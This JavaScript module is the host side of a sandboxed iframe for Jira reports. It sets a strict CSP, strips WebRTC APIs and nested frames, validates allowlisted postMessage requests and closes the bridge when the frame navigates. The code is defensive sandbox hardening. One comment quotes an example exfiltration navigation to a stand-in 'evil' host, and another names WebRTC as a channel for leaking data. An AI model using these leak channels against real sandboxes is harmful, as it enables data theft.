// Host side of the report sandbox: creates the nested frame and answers the allowlisted bridge.

export const REPORT_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; " +
  "font-src data:; base-uri 'none'; form-action 'none'";

// WebRTC (STUN/TURN) is not covered by CSP or iframe sandboxing in any shipping browser, so it is an
// exfiltration channel (TURN usernames, DNS names of ICE servers). Chromium ignores CSP `webrtc 'block'`.
// Defense in depth: remove the APIs before report code runs, and remove nested frames as they are
// added, because a child srcdoc frame would get fresh, un-patched globals.
export const REPORT_PRELUDE = `<script>(() => {
  for (const k of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel', 'RTCIceCandidate',
    'RTCSessionDescription', 'RTCRtpSender', 'RTCRtpReceiver', 'RTCRtpTransceiver', 'RTCDtlsTransport',
    'RTCIceTransport', 'RTCSctpTransport', 'RTCCertificate', 'RTCEncodedAudioFrame', 'RTCEncodedVideoFrame']) {
    try { Object.defineProperty(window, k, { value: undefined, writable: false, configurable: false }); } catch {}
  }
  const strip = (n) => {
    if (n.nodeType !== 1) return;
    if (/^(IFRAME|FRAME|OBJECT|EMBED|PORTAL|FENCEDFRAME)$/.test(n.tagName)) n.remove();
    else n.querySelectorAll('iframe,frame,object,embed,portal,fencedframe').forEach((x) => x.remove());
  };
  new MutationObserver((ms) => ms.forEach((m) => m.addedNodes.forEach(strip)))
    .observe(document, { childList: true, subtree: true });
})();</script>`;

// Prepended (not merely inserted into <head>) so it is the first thing the parser sees, before any
// report markup can run. A later <meta> CSP can only add restrictions, never remove these.
export function injectCsp(html) {
  return `<!doctype html><meta http-equiv="Content-Security-Policy" content="${REPORT_CSP}">${REPORT_PRELUDE}\n${html.replace(
    /^\s*<!doctype html>/i,
    '',
  )}`;
}

const DEFAULT_FIELDS = ['summary', 'status', 'issuetype', 'assignee', 'created', 'updated', 'duedate', 'parent'];
const FIELD_NAME = /^[A-Za-z0-9_.-]{1,100}$/;
const MAX_LIMIT = 10000;

/** Returns an error string, or null if `msg` is an allowed request. */
export function validateRequest(msg) {
  if (!msg || typeof msg !== 'object' || Array.isArray(msg)) return 'message must be an object';
  if (typeof msg.id !== 'string' && typeof msg.id !== 'number') return 'id must be a string or number';
  if (msg.type !== 'getIssues') return `unknown type ${JSON.stringify(String(msg.type)).slice(0, 60)}`;
  const allowed = new Set(['id', 'type', 'jql', 'fields', 'limit']);
  const extra = Object.keys(msg).filter((k) => !allowed.has(k));
  if (extra.length) return `unexpected properties: ${extra.join(', ')}`;
  if (typeof msg.jql !== 'string' || msg.jql.length > 10000) return 'jql must be a string (max 10000 chars)';
  if (msg.fields !== undefined) {
    if (!Array.isArray(msg.fields) || msg.fields.length > 100) return 'fields must be an array (max 100)';
    if (!msg.fields.every((f) => typeof f === 'string' && FIELD_NAME.test(f))) return 'fields must be field names';
  }
  if (msg.limit !== undefined && !(Number.isInteger(msg.limit) && msg.limit > 0 && msg.limit <= MAX_LIMIT)) {
    return `limit must be an integer 1..${MAX_LIMIT}`;
  }
  return null;
}

/**
 * Runs JQL as the viewer, following nextPageToken. `jira.request(path, init)` must return a fetch
 * Response — in Forge it is @forge/bridge's requestJira, so Jira enforces the viewer's permissions.
 */
export async function getIssues(jira, { jql, fields = DEFAULT_FIELDS, limit = MAX_LIMIT }) {
  const issues = [];
  let nextPageToken;
  let pages = 0;
  do {
    const res = await jira.request('/rest/api/3/search/jql', {
      method: 'POST',
      headers: { Accept: 'application/json', 'Content-Type': 'application/json' },
      body: JSON.stringify({ jql, fields, maxResults: Math.min(100, limit - issues.length), nextPageToken }),
    });
    pages++;
    const body = await res.json().catch(() => ({}));
    if (!res.ok) {
      const err = new Error((body.errorMessages || []).join('; ') || `Jira returned ${res.status}`);
      err.status = res.status;
      err.jira = body;
      throw err;
    }
    issues.push(...(body.issues || []));
    nextPageToken = body.isLast ? undefined : body.nextPageToken;
  } while (nextPageToken && issues.length < limit);
  return { issues, pages };
}

let frameCounter = 0;

/**
 * Mounts `html` in a sandboxed iframe inside `container` and serves bridge requests from it.
 * Options:
 *  - mode: 'srcdoc' | 'blob'
 *  - jira: { request(path, init) => Promise<Response> }
 *  - onLog(entry): every bridge message, accepted or rejected
 *  - onTestMessage(data): spike-only channel for attack-suite results (never answered)
 */
export function mountReport(container, html, { mode = 'srcdoc', jira, onLog = () => {}, onTestMessage } = {}) {
  const iframe = document.createElement('iframe');
  // No allow-same-origin => opaque origin. No allow-top-navigation, allow-popups, allow-forms,
  // allow-modals or allow-downloads.
  iframe.setAttribute('sandbox', 'allow-scripts');
  iframe.setAttribute('referrerpolicy', 'no-referrer');
  iframe.dataset.frameId = String(++frameCounter);
  iframe.style.cssText = 'width:100%;height:420px;border:1px solid #ccc;background:#fff';

  const doc = injectCsp(html);
  let blobUrl;
  if (mode === 'blob') {
    blobUrl = URL.createObjectURL(new Blob([doc], { type: 'text/html' }));
    iframe.src = blobUrl;
  } else {
    iframe.srcdoc = doc;
  }

  // A report that navigates its own frame (location = 'https://evil?data') becomes a different
  // document. Stop answering once that happens, so data posted with targetOrigin '*' cannot follow it.
  let loads = 0;
  let alive = true;
  iframe.addEventListener('load', () => {
    loads++;
    if (loads > 1) {
      alive = false;
      onLog({ frameId: iframe.dataset.frameId, accepted: false, reason: 'frame navigated; bridge closed' });
    }
  });

  const reply = (msg) => {
    if (alive && iframe.contentWindow) iframe.contentWindow.postMessage(msg, '*');
  };

  async function onMessage(event) {
    // Identity check: only the exact window object of this frame. Origin is "null" for every
    // sandboxed frame, so it cannot distinguish reports from each other or from attackers.
    if (event.source !== iframe.contentWindow) return;
    if (!alive) return;
    const msg = event.data;
    if (msg && msg.__spikeTest && onTestMessage) {
      onTestMessage(msg);
      return;
    }
    const error = validateRequest(msg);
    const id = msg && (typeof msg.id === 'string' || typeof msg.id === 'number') ? msg.id : null;
    if (error) {
      onLog({ frameId: iframe.dataset.frameId, accepted: false, reason: error, msg, jiraCalls: 0 });
      reply({ id, ok: false, error: { message: error } });
      return;
    }
    const started = performance.now();
    try {
      const { issues, pages } = await getIssues(jira, msg);
      const data = { issues };
      const bytes = JSON.stringify(data).length;
      const postStart = performance.now();
      reply({ id, ok: true, data });
      const postMs = performance.now() - postStart;
      onLog({
        frameId: iframe.dataset.frameId,
        accepted: true,
        msg,
        jiraCalls: pages,
        count: issues.length,
        bytes,
        jiraMs: Math.round(postStart - started),
        postMs: Math.round(postMs * 10) / 10,
      });
    } catch (e) {
      onLog({ frameId: iframe.dataset.frameId, accepted: true, msg, jiraError: e.message, status: e.status });
      reply({ id, ok: false, error: { message: e.message, status: e.status, jira: e.jira } });
    }
  }

  window.addEventListener('message', onMessage);
  container.append(iframe);

  return {
    iframe,
    destroy() {
      window.removeEventListener('message', onMessage);
      iframe.remove();
      if (blobUrl) URL.revokeObjectURL(blobUrl);
    },
  };
}

export async function sha256Hex(buffer) {
  const digest = await crypto.subtle.digest('SHA-256', buffer);
  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, '0')).join('');
}
